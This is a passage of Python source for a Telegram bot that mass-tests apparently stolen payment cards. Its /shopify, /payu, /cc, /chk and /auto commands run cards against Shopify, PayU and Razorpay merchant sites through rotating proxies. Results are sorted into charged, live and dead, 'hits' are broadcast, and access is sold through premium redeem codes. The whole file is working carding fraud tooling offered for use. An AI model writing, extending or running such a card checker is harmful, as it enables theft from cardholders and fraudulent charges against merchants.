                    if now - lt[0] >= 1.0:
                        lt[0] = now
                        if key in active_sessions:
                            try: await update_payu_progress(uid, st.id, results, results['checked'])
                            except: pass
                    await asyncio.sleep(0.2)
        except Exception as e:
            await bot.send_message(uid, premium_emoji(f"❌ Error: {e}"), parse_mode='html')
        finally:
            if key in active_sessions: del active_sessions[key]
            try: await st.delete()
            except: pass
            await send_payu_final_results(uid, results)
    else:
        args = event.message.text.split(' ', 1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/shopify card|mm|yy|cvv</code> or reply .txt"), parse_mode='html'); return
        cards = extract_cc(args[1].strip())
        if not cards: await event.reply(premium_emoji("❌ Invalid CC."), parse_mode='html'); return
        card = cards[0]
        st = await event.reply(premium_emoji(f"<b>⚡ Shopify Checking...</b>\n💳 <code>{card}</code>"), parse_mode='html')
        try:
            r = await check_card_shopify_with_retry(card, load_sites(), load_proxies(), 3)
            increment_user_checks(uid)
            await save_user_stats(uid, r['status'] in ['Charged', 'Approved'])
            brand, bt, lv, bk, cn, fl = await get_bin_info(card.split('|')[0])
            em = "✅" if r['status'] == 'Charged' else ("🔥" if r['status'] == 'Approved' else "❌")
            stt = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if r['status'] == 'Charged' else ("𝐋𝐢𝐯𝐞" if r['status'] == 'Approved' else "𝐃𝐞𝐚𝐝")
            fr = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>💠 𝐒𝐡𝐨𝐩𝐢𝐟𝐲</b>
<blockquote>{em} Status: {stt}</blockquote>
<blockquote>💳 <code>{r['card']}</code></blockquote>
<blockquote>📝 {r['message'][:150]}</blockquote>
<blockquote>🌐 {r.get('gateway', 'shopify')} | 💰 {r.get('price', '-')}</blockquote>
<b>💠 𝐁𝐈𝐍</b>
<pre>{brand} - {bt} - {lv}
{bk} | {cn} {fl}</pre>
<b>👑 Support:</b> @its_chirag_real"""
            await st.edit(premium_emoji(fr), parse_mode='html')
            if r['status'] in ['Charged', 'Approved']:
                try:
                    s = await event.get_sender()
                    un = s.username if s.username else f"user_{uid}"
                    await send_realtime_hit(uid, r, r['status'], un)
                except: pass
        except Exception as e:
            await st.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

# ---------- /payu ----------
@bot.on(events.NewMessage(pattern='/payu'))
async def payu_cmd(event):
    uid = event.sender_id
    cid = event.chat_id
    if is_banned(uid): await event.reply(premium_emoji("🚫 Banned."), parse_mode='html'); return
    if is_maintenance() and not is_admin(uid): await event.reply(premium_emoji("🔧 Maintenance."), parse_mode='html'); return
    if not await is_user_joined(uid): await send_force_join_message(event); return
    if not is_free_group(cid) and not is_premium(uid) and not is_admin(uid):
        await event.reply(premium_emoji("❌ Premium only."), parse_mode='html'); return
    payu_apis = [u for u in CHECKER_API_URLS if 'payu' in u.lower() or 'payfast' in u.lower()]
    if not payu_apis: await event.reply(premium_emoji("❌ No PayU API."), parse_mode='html'); return
    
    if event.reply_to_msg_id:
        r = await event.get_reply_message()
        if not r.file or not r.file.name.endswith('.txt'):
            await event.reply(premium_emoji("❌ Reply to .txt"), parse_mode='html'); return
        st = await event.reply(premium_emoji("🔄 Processing..."), parse_mode='html')
        fp = await r.download_media()
        async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = extract_cc(content)
        if not cards:
            await st.edit(premium_emoji("❌ No cards."), parse_mode='html'); os.remove(fp); return
        if len(cards) > 5000: cards = cards[:5000]
        os.remove(fp)
        total = len(cards)
        results = {'charged': [], 'approved': [], 'dead': [], 'total': total, 'checked': 0, 'start_time': time.time()}
        key = f"payu_{uid}_{st.id}"
        active_sessions[key] = {'paused': False}
        try:
            lt = [time.time()]
            for i in range(0, len(cards), 5):
                if key not in active_sessions: break
                while active_sessions.get(key, {}).get('paused', False):
                    await asyncio.sleep(1)
                    if key not in active_sessions: break
                for card in cards[i:i+5]:
                    if key not in active_sessions: break
                    r = await check_card_payu(card, payu_apis)
                    results['checked'] += 1
                    if r['status'] == 'Charged':
                        results['charged'].append(r); increment_user_checks(uid)
                        await save_user_stats(uid, True)
                        try:
                            s = await event.get_sender()
                            un = s.username if s.username else f"user_{uid}"
                            await send_realtime_hit(uid, r, 'Charged', un)
                        except: pass
                    elif r['status'] == 'Approved':
                        results['approved'].append(r); increment_user_checks(uid)
                        await save_user_stats(uid, True)
                        try:
                            s = await event.get_sender()
                            un = s.username if s.username else f"user_{uid}"
                            await send_realtime_hit(uid, r, 'Approved', un)
                        except: pass
                    else:
                        results['dead'].append(r); increment_user_checks(uid)
                        await save_user_stats(uid, False)
                    now = time.time()
                    if now - lt[0] >= 1.0:
                        lt[0] = now
                        if key in active_sessions:
                            try: await update_payu_progress(uid, st.id, results, results['checked'])
                            except: pass
                    await asyncio.sleep(0.2)
        except Exception as e:
            await bot.send_message(uid, premium_emoji(f"❌ Error: {e}"), parse_mode='html')
        finally:
            if key in active_sessions: del active_sessions[key]
            try: await st.delete()
            except: pass
            await send_payu_final_results(uid, results)
    else:
        args = event.message.text.split(' ', 1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/payu card|mm|yy|cvv</code> or reply .txt"), parse_mode='html'); return
        cards = extract_cc(args[1].strip())
        if not cards: await event.reply(premium_emoji("❌ Invalid CC."), parse_mode='html'); return
        card = cards[0]
        st = await event.reply(premium_emoji(f"<b>⚡ PayU Checking...</b>\n💳 <code>{card}</code>"), parse_mode='html')
        try:
            r = await check_card_payu(card, payu_apis)
            increment_user_checks(uid)
            await save_user_stats(uid, r['status'] in ['Charged', 'Approved'])
            brand, bt, lv, bk, cn, fl = await get_bin_info(card.split('|')[0])
            em = "✅" if r['status'] == 'Charged' else ("🔥" if r['status'] == 'Approved' else "❌")
            stt = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if r['status'] == 'Charged' else ("𝐋𝐢𝐯𝐞" if r['status'] == 'Approved' else "𝐃𝐞𝐚𝐝")
            fr = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>💠 𝐏𝐚𝐲𝐔</b>
<blockquote>{em} Status: {stt}</blockquote>
<blockquote>💳 <code>{r['card']}</code></blockquote>
<blockquote>📝 {r['message'][:150]}</blockquote>
<blockquote>🌐 {r.get('gateway', 'payfast')} | 💰 {r.get('price', '-')}</blockquote>
<b>💠 𝐁𝐈𝐍</b>
<pre>{brand} - {bt} - {lv}
{bk} | {cn} {fl}</pre>
<b>👑 Support:</b> @its_chirag_real"""
            await st.edit(premium_emoji(fr), parse_mode='html')
            if r['status'] in ['Charged', 'Approved']:
                try:
                    s = await event.get_sender()
                    un = s.username if s.username else f"user_{uid}"
                    await send_realtime_hit(uid, r, r['status'], un)
                except: pass
        except Exception as e:
            await st.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

# ---------- /cc ----------
@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def cc_cmd(event):
    uid = event.sender_id
    cid = event.chat_id
    if is_banned(uid): await event.reply(premium_emoji("🚫 Banned."), parse_mode='html'); return
    if is_maintenance() and not is_admin(uid): await event.reply(premium_emoji("🔧 Maintenance."), parse_mode='html'); return
    if not await is_user_joined(uid): await send_force_join_message(event); return
    if not is_free_group(cid) and not is_premium(uid) and not is_admin(uid):
        await event.reply(premium_emoji("❌ Premium only."), parse_mode='html'); return
    ss = load_sites()
    px = load_proxies()
    if not ss: await event.reply(premium_emoji("❌ No sites."), parse_mode='html'); return
    if not px: await event.reply(premium_emoji("❌ No proxies."), parse_mode='html'); return
    cards = extract_cc(event.message.text.split(' ', 1)[1].strip())
    if not cards: await event.reply(premium_emoji("❌ Invalid CC."), parse_mode='html'); return
    card = cards[0]
    st = await event.reply(premium_emoji(f"<b>⚡ Checking...</b>\n💳 <code>{card}</code>"), parse_mode='html')
    try:
        r = await check_card_with_retry(card, ss, px, 3)
        increment_user_checks(uid)
        await save_user_stats(uid, r['status'] in ['Charged', 'Approved'])
        brand, bt, lv, bk, cn, fl = await get_bin_info(card.split('|')[0])
        em = "✅" if r['status'] == 'Charged' else ("🔥" if r['status'] == 'Approved' else "❌")
        stt = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if r['status'] == 'Charged' else ("𝐋𝐢𝐯𝐞" if r['status'] == 'Approved' else "𝐃𝐞𝐚𝐝")
        fr = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>{em} Status: {stt}</blockquote>
<blockquote>💳 <code>{r['card']}</code></blockquote>
<blockquote>📝 {r['message'][:150]}</blockquote>
<blockquote>🌐 {r.get('gateway', 'Unknown')} | 💰 {r.get('price', '-')}</blockquote>
<b>💠 𝐁𝐈𝐍</b>
<pre>{brand} - {bt} - {lv}
{bk} | {cn} {fl}</pre>
<b>👑 Support:</b> @its_chirag_real"""
        await st.edit(premium_emoji(fr), parse_mode='html')
        if r['status'] in ['Charged', 'Approved']:
            try:
                s = await event.get_sender()
                un = s.username if s.username else f"user_{uid}"
                await send_realtime_hit(uid, r, r['status'], un)
            except: pass
    except Exception as e:
        await st.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

# ---------- /chk ----------
@bot.on(events.NewMessage(pattern='/chk'))
async def chk_cmd(event):
    uid = event.sender_id
    cid = event.chat_id
    if is_banned(uid): await event.reply(premium_emoji("🚫 Banned."), parse_mode='html'); return
    if is_maintenance() and not is_admin(uid): await event.reply(premium_emoji("🔧 Maintenance."), parse_mode='html'); return
    if not await is_user_joined(uid): await send_force_join_message(event); return
    if not is_free_group(cid) and not is_premium(uid) and not is_admin(uid):
        await event.reply(premium_emoji("❌ Premium only."), parse_mode='html'); return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to .txt"), parse_mode='html'); return
    r = await event.get_reply_message()
    if not r.file or not r.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Need .txt"), parse_mode='html'); return
    ss = load_sites()
    px = load_proxies()
    if not ss: await event.reply(premium_emoji("❌ No sites."), parse_mode='html'); return
    if not px: await event.reply(premium_emoji("❌ No proxies."), parse_mode='html'); return
    st = await event.reply(premium_emoji("🔄 Processing..."), parse_mode='html')
    fp = await r.download_media()
    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    cards = extract_cc(content)
    if not cards:
        await st.edit(premium_emoji("❌ No cards."), parse_mode='html'); os.remove(fp); return
    if len(cards) > 5000: cards = cards[:5000]
    os.remove(fp)
    total = len(cards)
    results = {'charged': [], 'approved': [], 'dead': [], 'total': total, 'checked': 0, 'start_time': time.time()}
    key = f"{uid}_{st.id}"
    active_sessions[key] = {'paused': False}
    try:
        lt = [time.time()]
        for i in range(0, len(cards), 5):
            if key not in active_sessions: break
            while active_sessions.get(key, {}).get('paused', False):
                await asyncio.sleep(1)
                if key not in active_sessions: break
            for card in cards[i:i+5]:
                if key not in active_sessions: break
                rr = await check_card_with_retry(card, load_sites(), load_proxies(), 1)
                results['checked'] += 1
                if rr['status'] == 'Charged':
                    results['charged'].append(rr); increment_user_checks(uid)
                    await save_user_stats(uid, True)
                    try:
                        s = await event.get_sender()
                        un = s.username if s.username else f"user_{uid}"
                        await send_realtime_hit(uid, rr, 'Charged', un)
                    except: pass
                elif rr['status'] == 'Approved':
                    results['approved'].append(rr); increment_user_checks(uid)
                    await save_user_stats(uid, True)
                    try:
                        s = await event.get_sender()
                        un = s.username if s.username else f"user_{uid}"
                        await send_realtime_hit(uid, rr, 'Approved', un)
                    except: pass
                else:
                    results['dead'].append(rr); increment_user_checks(uid)
                    await save_user_stats(uid, False)
                now = time.time()
                if now - lt[0] >= 1.0:
                    lt[0] = now
                    if key in active_sessions:
                        try: await update_progress(uid, st.id, results, results['checked'])
                        except: pass
                await asyncio.sleep(0.2)
    except Exception as e:
        await bot.send_message(uid, premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        if key in active_sessions: del active_sessions[key]
        try: await st.delete()
        except: pass
        await send_final_results(uid, results)

# ---------- /auto ----------
@bot.on(events.NewMessage(pattern='/auto'))
async def auto_cmd(event):
    uid = event.sender_id
    cid = event.chat_id
    if is_banned(uid): await event.reply(premium_emoji("🚫 Banned."), parse_mode='html'); return
    if is_maintenance() and not is_admin(uid): await event.reply(premium_emoji("🔧 Maintenance."), parse_mode='html'); return
    if not await is_user_joined(uid): await send_force_join_message(event); return
    if not is_free_group(cid) and not is_premium(uid) and not is_admin(uid):
        await event.reply(premium_emoji("❌ Premium only."), parse_mode='html'); return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to .txt"), parse_mode='html'); return
    r = await event.get_reply_message()
    if not r.file or not r.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Need .txt"), parse_mode='html'); return
    ss = load_sites()
    px = load_proxies()
    if not ss: await event.reply(premium_emoji("❌ No sites."), parse_mode='html'); return
    if not px: await event.reply(premium_emoji("❌ No proxies."), parse_mode='html'); return
    st = await event.reply(premium_emoji("🔄 Processing..."), parse_mode='html')
    fp = await r.download_media()
    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    cards = extract_cc(content)
    if not cards:
        await st.edit(premium_emoji("❌ No cards."), parse_mode='html'); os.remove(fp); return
    if len(cards) > 5000: cards = cards[:5000]
    os.remove(fp)
    total = len(cards)
    key = f"auto_{uid}_{st.id}"
    auto_check_tasks[key] = {'paused': False, 'stopped': False, 'cards': cards, 'total': total, 'checked': 0}
    progress = await bot.send_message(cid, premium_emoji(f"🤖 <b>Auto Started!</b>\nTotal: {total}"), parse_mode='html')
    results = {'charged': [], 'approved': [], 'dead': [], 'total': total, 'checked': 0, 'start_time': time.time()}
    try:
        lt = [time.time()]
        for i in range(0, len(cards), 5):
            if auto_check_tasks.get(key, {}).get('stopped', False): break
            while auto_check_tasks.get(key, {}).get('paused', False):
                await asyncio.sleep(1)
                if auto_check_tasks.get(key, {}).get('stopped', False): break
            for card in cards[i:i+5]:
                if auto_check_tasks.get(key, {}).get('stopped', False): break
                rr = await check_card_with_retry(card, load_sites(), load_proxies(), 1)
                results['checked'] += 1
                if rr['status'] == 'Charged':
                    results['charged'].append(rr); increment_user_checks(uid)
                    await save_user_stats(uid, True)
                    try:
                        s = await event.get_sender()
                        un = s.username if s.username else f"user_{uid}"
                        await send_realtime_hit(uid, rr, 'Charged', un)
                    except: pass
                elif rr['status'] == 'Approved':
                    results['approved'].append(rr); increment_user_checks(uid)
                    await save_user_stats(uid, True)
                    try:
                        s = await event.get_sender()
                        un = s.username if s.username else f"user_{uid}"
                        await send_realtime_hit(uid, rr, 'Approved', un)
                    except: pass
                else:
                    results['dead'].append(rr); increment_user_checks(uid)
                    await save_user_stats(uid, False)
                now = time.time()
                if now - lt[0] >= 1.0:
                    lt[0] = now
                    if key in auto_check_tasks:
                        try: await update_progress(uid, progress.id, results, results['checked'])
                        except: pass
                await asyncio.sleep(0.2)
    except Exception as e:
        await bot.send_message(uid, premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        if key in auto_check_tasks: del auto_check_tasks[key]
        try: await st.delete()
        except: pass
        try: await progress.delete()
        except: pass
        await send_final_results(uid, results)

# ---------- /mcancel ----------
@bot.on(events.NewMessage(pattern='/mcancel'))
async def mcancel_cmd(event):
    uid = event.sender_id
    if is_banned(uid): await event.reply(premium_emoji("🚫 Banned."), parse_mode='html'); return
    canceled = False
    for k in list(active_sessions.keys()):
        if k.startswith(f"{uid}_") or k.startswith(f"payu_{uid}_") or k.startswith(f"shopify_{uid}_") or k.startswith(f"razorpay_{uid}_"):
            del active_sessions[k]; canceled = True
    for k in list(auto_check_tasks.keys()):
        if k.startswith(f"auto_{uid}_"):
            auto_check_tasks[k]['stopped'] = True
            del auto_check_tasks[k]; canceled = True
    if canceled: await event.reply(premium_emoji("✅ All cancelled."), parse_mode='html')
    else: await event.reply(premium_emoji("❌ No active checks."), parse_mode='html')

# ---------- /proxy ----------
@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_cmd(event):
    uid = event.sender_id
    if is_banned(uid): await event.reply(premium_emoji("🚫 Banned."), parse_mode='html'); return
    if is_maintenance() and not is_admin(uid): await event.reply(premium_emoji("🔧 Maintenance."), parse_mode='html'); return
    if not await is_user_joined(uid): await send_force_join_message(event); return
    ps = load_proxies()
    if not ps: await event.reply(premium_emoji("❌ No proxies."), parse_mode='html'); return
    st = await event.reply(premium_emoji(f"🔥 Checking {len(ps)} proxies..."), parse_mode='html')
    alive, dead = [], []
    for i in range(0, len(ps), 50):
        batch = ps[i:i+50]
        rs = await asyncio.gather(*[test_proxy(p) for p in batch])
        for r in rs:
            if r['status'] == 'alive': alive.append(r['proxy'])
            else: dead.append(r['proxy'])
        await st.edit(premium_emoji(f"🔥 Checking...\nAlive: {len(alive)} | Dead: {len(dead)}"), parse_mode='html')
    save_proxies(alive)
    await st.edit(premium_emoji(f"✅ Done!\nAlive: {len(alive)} | Removed: {len(dead)}"), parse_mode='html')

# ---------- /addproxy ----------
@bot.on(events.NewMessage(pattern='/addproxy'))
async def addproxy_cmd(event):
    uid = event.sender_id
    if is_banned(uid): await event.reply(premium_emoji("🚫 Banned."), parse_mode='html'); return
    if is_maintenance() and not is_admin(uid): await event.reply(premium_emoji("🔧 Maintenance."), parse_mode='html'); return
    if not await is_user_joined(uid): await send_force_join_message(event); return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a message with proxies."), parse_mode='html'); return
    r = await event.get_reply_message()
    if not r.text: await event.reply(premium_emoji("❌ No text."), parse_mode='html'); return
    ps = [p.strip() for p in r.text.split('\n') if p.strip()]
    cur = load_proxies()
    added = 0
    for p in ps:
        if p not in cur:
            with open(PROXY_FILE, 'a') as f: f.write(f"{p}\n")
            added += 1
    await event.reply(premium_emoji(f"✅ Added {added} proxies."), parse_mode='html')

# ---------- /getproxy ----------
@bot.on(events.NewMessage(pattern='/getproxy'))
async def getproxy_cmd(event):
    uid = event.sender_id
    if is_banned(uid): await event.reply(premium_emoji("🚫 Banned."), parse_mode='html'); return
    if is_maintenance() and not is_admin(uid): await event.reply(premium_emoji("🔧 Maintenance."), parse_mode='html'); return
    if not await is_user_joined(uid): await send_force_join_message(event); return
    ps = load_proxies()
    if not ps: await event.reply(premium_emoji("❌ No proxies."), parse_mode='html'); return
    if len(ps) <= 50:
        txt = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(ps)])
        await event.reply(premium_emoji(f"📋 <b>Proxies ({len(ps)}):</b>\n\n{txt}"), parse_mode='html')
    else:
        fn = f"proxies_{uid}_{int(time.time())}.txt"
        async with aiofiles.open(fn, 'w') as f:
            for p in ps: await f.write(f"{p}\n")
        await event.reply(premium_emoji(f"📋 <b>Proxies ({len(ps)}):</b>"), file=fn, parse_mode='html')
        try: os.remove(fn)
        except: pass

# ---------- /clearproxy ----------
@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clearproxy_cmd(event):
    uid = event.sender_id
    if is_banned(uid): await event.reply(premium_emoji("🚫 Banned."), parse_mode='html'); return
    if is_maintenance() and not is_admin(uid): await event.reply(premium_emoji("🔧 Maintenance."), parse_mode='html'); return
    if not await is_user_joined(uid): await send_force_join_message(event); return
    c = len(load_proxies())
    save_proxies([])
    await event.reply(premium_emoji(f"✅ Cleared {c} proxies."), parse_mode='html')

# ---------- /redeem ----------
@bot.on(events.NewMessage(pattern='/redeem'))
async def redeem_cmd(event):
    uid = event.sender_id
    if is_banned(uid): await event.reply(premium_emoji("🚫 Banned."), parse_mode='html'); return
    if is_maintenance() and not is_admin(uid): await event.reply(premium_emoji("🔧 Maintenance."), parse_mode='html'); return
    if not await is_user_joined(uid): await send_force_join_message(event); return
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: /redeem <code>"), parse_mode='html'); return
    code = args[1].strip().upper()
    try:
        s = await event.get_sender()
        un = s.username if s.username else f"user_{uid}"
        fn = s.first_name if s.first_name else "User"
    except: un, fn = f"user_{uid}", "User"
    r = redeem_code(uid, code)
    if r['success']:
        inv = f"INV-{secrets.token_hex(4).upper()}"
        await event.reply(premium_emoji(f"✅ Redeemed!\n🎁 {r['plan_display']}\n⏳ {r['duration_days']} Days\n📅 {r['expiry'][:10]}\n🧾 {inv}"), parse_mode='html')
        await send_premium_invoice_to_user(uid, un, r['plan'], r['plan_display'], r['duration_days'], r['expiry'], code, inv)
        await send_premium_invoice_to_admins(uid, un, r['plan'], r['plan_display'], r['duration_days'], r['expiry'], code, inv, fn)
        await send_thank_you_message(uid, un, r['plan_display'])
        await send_log('redeem', uid, un, f'Redeemed: {inv}', {'Plan': r['plan_display'], 'Code': code})
    else:
        await event.reply(premium_emoji(f"❌ Failed: {r['reason']}"), parse_mode='html')

# ---------- /feedback ----------
@bot.on(events.NewMessage(pattern='/feedback'))
async def feedback_cmd(event):
    uid = event.sender_id
    if is_banned(uid): await event.reply(premium_emoji("🚫 Banned."), parse_mode='html'); return
    if is_maintenance() and not is_admin(uid): await event.reply(premium_emoji("🔧 Maintenance."), parse_mode='html'); return
    if not await is_user_joined(uid): await send_force_join_message(event); return
    feedback_state[str(uid)] = {'step': 'awaiting_feedback'}
    await event.reply(premium_emoji("📝 Send your feedback (text or photo).\n\nCancel with /cancel"), parse_mode='html')

# ---------- /cancel ----------
@bot.on(events.NewMessage(pattern='/cancel'))
async def cancel_cmd(event):
    uid = event.sender_id
    if str(uid) in feedback_state:
        del feedback_state[str(uid)]
        await event.reply(premium_emoji("❌ Cancelled."), parse_mode='html')
    elif uid in admin_actions:
        del admin_actions[uid]
        await event.reply(premium_emoji("❌ Cancelled."), parse_mode='html')
    else:
        await event.reply(premium_emoji("ℹ️ Nothing to cancel."), parse_mode='html')

# ---------- /masscodes ----------
@bot.on(events.NewMessage(pattern='/masscodes'))
async def masscodes_cmd(event):
    uid = event.sender_id
    if not is_admin(uid): await event.reply(premium_emoji("❌ Admin only."), parse_mode='html'); return
    args = event.message.text.split()
    if len(args) < 3: await event.reply(premium_emoji("❌ Usage: /masscodes <plan> <count>"), parse_mode='html'); return
    p = args[1].lower(); c = args[2]
    if p not in PLANS or not c.isdigit(): await event.reply(premium_emoji("❌ Invalid."), parse_mode='html'); return
    c = int(c)
    if c < 1 or c > 100: await event.reply(premium_emoji("❌ 1-100 only."), parse_mode='html'); return
    cs = generate_mass_codes(p, c)
    txt = "\n".join([f"<code>{x}</code>" for x in cs])
    fn = f"codes_{p}_{int(time.time())}.txt"
    async with aiofiles.open(fn, 'w') as f:
        for x in cs: await f.write(f"{x}\n")
    await event.reply(premium_emoji(f"✅ {c} codes for {p}:\n\n{txt}"), file=fn, parse_mode='html')
    try: os.remove(fn)
    except: pass

# ---------- CALLBACK HANDLERS ----------
@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_h(event):
    uid = event.sender_id; mid = event.message_id
    for pref in ['', 'payu_', 'shopify_', 'razorpay_']:
        k = f"{pref}{uid}_{mid}"
        if k in active_sessions: active_sessions[k]['paused'] = True
    ak = f"auto_{uid}_{mid}"
    if ak in auto_check_tasks: auto_check_tasks[ak]['paused'] = True
    await event.answer("⏸️ Paused")

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_h(event):
    uid = event.sender_id; mid = event.message_id
    for pref in ['', 'payu_', 'shopify_', 'razorpay_']:
        k = f"{pref}{uid}_{mid}"
        if k in active_sessions: active_sessions[k]['paused'] = False
    ak = f"auto_{uid}_{mid}"
    if ak in auto_check_tasks: auto_check_tasks[ak]['paused'] = False
    await event.answer("▶️ Resumed")

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_h(event):
    uid = event.sender_id; mid = event.message_id
    for pref in ['', 'payu_', 'shopify_', 'razorpay_']:
        k = f"{pref}{uid}_{mid}"
        if k in active_sessions: del active_sessions[k]
    ak = f"auto_{uid}_{mid}"
    if ak in auto_check_tasks: auto_check_tasks[ak]['stopped'] = True; del auto_check_tasks[ak]
    await event.answer("🛑 Stopped")
    try: await event.edit(premium_emoji("🛑 Stopped."), parse_mode='html')
    except: pass

# ---------- STARTUP ----------
async def auto_add_admins():
    for aid in ADMIN_IDS:
        if str(aid) not in load_premium_users():
            with open(PREMIUM_FILE, 'a', encoding='utf-8') as f:
                f.write(f"{aid}\n")
            print(f"✅ Admin {aid} added to premium!")

async def load_default_razorpay_sites():
    if os.path.exists(RAZORPAY_SITES_FILE) and load_razorpay_sites():
        print(f"✅ {len(load_razorpay_sites())} Razorpay sites loaded")
        return
    sites = [s.strip() for s in DEFAULT_RAZORPAY_SITES.splitlines() if s.strip()]
    save_razorpay_sites(sites)
    print(f"✅ Loaded {len(sites)} Razorpay sites")

async def load_default_proxies():
    if os.path.exists(PROXY_FILE) and load_proxies():
        print(f"✅ {len(load_proxies())} proxies loaded")
        return
    ps = [p.strip() for p in DEFAULT_PROXIES.splitlines() if p.strip()]
    save_proxies(ps)
    print(f"✅ Loaded {len(ps)} proxies")

async def load_default_shopify_sites():
    if os.path.exists(SITES_FILE) and load_sites():
        print(f"✅ {len(load_sites())} Shopify sites loaded")
        return
    ss = [s.strip() for s in DEFAULT_SITES.splitlines() if s.strip()]
    save_sites(ss)
    print(f"✅ Loaded {len(ss)} Shopify sites")

async def health_check():
    try:
        import http.server, threading
        class H(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'OK')
            def log_message(self, *a): pass
        port = int(os.environ.get('PORT', 8080))
        srv = http.server.HTTPServer(('0.0.0.0', port), H)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        print(f"✅ Health check on port {port}")
    except Exception as e:
        print(f"⚠️ Health check failed: {e}")

async def main():
    await health_check()
    await auto_add_admins()
    await load_default_shopify_sites()
    await load_default_razorpay_sites()
    await load_default_proxies()
    print("✅ Bot started!")
    print(f"📡 APIs: {CHECKER_API_URLS}")
    print(f"🌐 Shopify Sites: {len(load_sites())}")
    print(f"💳 Razorpay Sites: {len(load_razorpay_sites())}")
    print(f"🔌 Proxies: {len(load_proxies())}")

try:
    loop = asyncio.get_event_loop()
    if loop.is_running(): loop.create_task(main())
    else: loop.run_until_complete(main())
except RuntimeError:
    nl = asyncio.new_event_loop()
    asyncio.set_event_loop(nl)
    nl.run_until_complete(main())

bot.run_until_disconnected()